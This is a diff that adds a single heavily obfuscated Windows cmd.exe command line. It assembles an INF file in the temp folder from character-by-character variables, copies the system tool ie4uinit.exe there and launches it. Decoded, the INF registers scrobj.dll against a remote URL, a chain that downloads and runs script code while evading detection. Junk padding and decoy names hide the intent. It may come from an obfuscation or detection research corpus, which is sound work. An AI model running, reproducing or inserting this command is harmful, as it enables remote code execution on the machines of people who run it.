@@ -1,0 +1,20 @@
+/v /c  (for %u in ("okta=a" "trinkermen=e" "adiabatically=et" ) do @set %~u) &&
+  (for %n in ("c") do @set "arkansans=%~n") &&
+  callcall(for %z in ("9") do @set "disendower=%~z") &&
+  (for %l in ("t") do @set "nonprofane=%~l") &&
+  callcall(for %h in ("n") do @set "controvertible=%~h") &&
+  (for %e in ("$") do @set "cirri=%~e") &&
+  call(for %n in ("p") do @set "lactant=%~n") &&
+  (for %c in ("e") do @set "soused=%~c") &&
+  (for %y in ("i") do @set "irruptible=%~y") &&
+  call(for %j in ("m") do @set "distrustful=%~j") &&
+  callcallcall(for %e in ("7") do @set "glowingly=%~e") &&
+  call(for %e in ("[") do @set "unhushable=%~e") &&
+  (for %f in ("a") do @set "micrograms=%~f") &&
+  callcallcallcallcallcallcallcall(for %f in ("y") do @set "leasow=%~f") &&
+  call(for %m in ("A") do @set "crotchy=%~m") &&
+  callcall(for %e in ("%windir%") do @set "caninities=%~e") &&
+  callcall(for %m in ("2") do @set "potableness=%~m") &&
+  call(for %o in ("[maculicolous_9939]" "%macrural%c%auxeses%o%unabrased%\" "j%juvenescence%d%motel%l,%derelicts%I,%allopelagic%t%witched%p%spignet%/%blepharocera%p%macrural%d%prorecall%b%anesthesiology%n%juvenescence%c%spectrality%m%blepharocera%r%macrural%d" "[destinationdirs]" "defaultdestdir=11" "5AE479=01" "[strings]" "servicename= 'donnie'" "shortsvcname= 'donnie'" "juvenescence=." "blepharocera=/" "spignet=:" "derelicts=N" "unabrased=b" "prorecall=e" "allopelagic=h" "anesthesiology=i" "motel=l" "fixer=n" "spectrality=o" "auxeses=r" "macrural=s" "witched=t" "[defaultinstall.windows7]" "delfiles=5AE479" "Un\" "Register\" "OCXs=maculicolous_9939" "[version]" "signature=$windows nt$" "[5AE479]" "i%prorecall%u%anesthesiology%n%anesthesiology%t%juvenescence%i%fixer%f" ) do @echo %~o) > "%temp%\ieuinit.inf" &&
+  call xcopy /Y /C /Q %windir%\system32\ie4uinit.exe "%temp%" &&
+  start " " %temp%\ie4uinit.exe -basesettings
